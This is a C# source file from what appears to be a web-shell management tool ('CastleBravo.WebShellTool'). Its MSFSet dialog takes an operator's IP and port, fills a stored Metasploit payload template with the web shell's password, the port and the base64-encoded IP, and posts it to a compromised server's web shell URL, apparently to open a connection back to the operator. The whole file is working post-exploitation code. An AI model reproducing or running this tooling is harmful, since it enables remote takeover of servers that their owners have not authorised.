using C2.Controls;
using C2.Core;
using C2.Utils;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace C2.Business.CastleBravo.WebShellTool
{
    partial class MSFSet : StandardDialog
    {
        protected string RemoteHost { get => rhTextBox.Text.Trim(); set => rhTextBox.Text = value; }
        protected readonly WebShellTaskConfig task;
        protected readonly ProxySetting proxy;
        protected string payload;

        public MSFSet(WebShellTaskConfig taskConfig, ProxySetting proxy)
        {
            InitializeComponent();
            
            this.task = taskConfig;
            this.proxy = proxy;

            this.payload = ClientSetting.MSFPayload;
            this.RemoteHost = ClientSetting.MSFHost;
        }

        protected override bool OnOKButtonClick()
        {
            
            if (RemoteHost.IsNullOrEmpty())
            {
                HelpUtil.ShowMessageBox("地址不能为空。");
                return false;
            }
            string RegexStr = @"((\d{1,3}\.){3}\d{1,3}):(\d{3,5})";
            Match mc = Regex.Match(RemoteHost.Trim(), RegexStr);
            
            if (mc.Groups.Count < 3)
            {
                HelpUtil.ShowMessageBox("格式有误, 不符合【IP:端口】的形式");
                return false;
            }
            string encodeIP = ST.EncodeBase64(mc.Groups[1].Value);
            string port = mc.Groups[3].Value;

            SetRemoteHost();

            Task.Run(() => PostPayload(string.Format(payload, task.Password, port, encodeIP)));
            return base.OnOKButtonClick();
        }

        protected virtual void SetRemoteHost()
        {
            ClientSetting.MSFHost = RemoteHost.Trim();
        }
            
        protected string PostPayload(string payload)
        {
            try 
            { 
                return WebClientEx.Post(NetUtil.FormatUrl(task.Url), payload, 900000, proxy);
            }
            catch
            {
                return string.Empty;
            }   
        }
    }
}
